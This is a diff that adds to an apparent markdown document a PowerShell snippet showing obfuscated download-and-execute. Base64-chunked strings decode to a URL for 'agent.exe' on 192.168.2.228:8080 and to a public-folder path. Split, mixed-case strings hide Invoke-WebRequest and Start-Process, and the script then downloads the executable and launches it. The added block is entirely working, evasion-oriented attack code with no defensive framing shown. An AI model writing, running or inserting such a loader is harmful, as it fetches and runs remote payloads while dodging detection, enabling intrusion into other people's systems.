@@ -51,3 +51,35 @@ Add-Type $MyBusinessLogic
 
 [MyBusinessLogic]::Main()
 ```
+
+```powershell
+# Base64-encoded and chunked strings
+$a = "a" + "HR0cDovLzE5Mi4xNjguMi4yMjg6ODA4MC9hZ2VudC5leGU="   # http://192.168.2.228:8080/agent.exe
+$b = "YWdlbnQuZXhl"                                            # agent.exe
+$c = "QzpcVXNlcnNcUHVibGlj"                                    # C:\Users\Public
+
+# Decode function
+$d = {
+    param($e)
+    [System.Text.Encoding]::UTF8.GetString(
+        [System.Convert]::FromBase64String($e)
+    )
+}
+
+# Decoded values
+$u = & $d $a   # URL
+$n = & $d $b   # Executable name
+$p = & $d $c   # Destination path
+
+# Full path
+$f = (Join-Path $p $n)
+
+# Obfuscated command aliases
+$w = "i" + "wr"   # Invoke-WebRequest
+$x = "s" + "TarT" + "-pr" + "OCesS"         # Start-Process
+
+# Download and execute
+& (Get-Command $w) -Uri $u -OutFile $f
+& (Get-Command $x) $f
+
+```
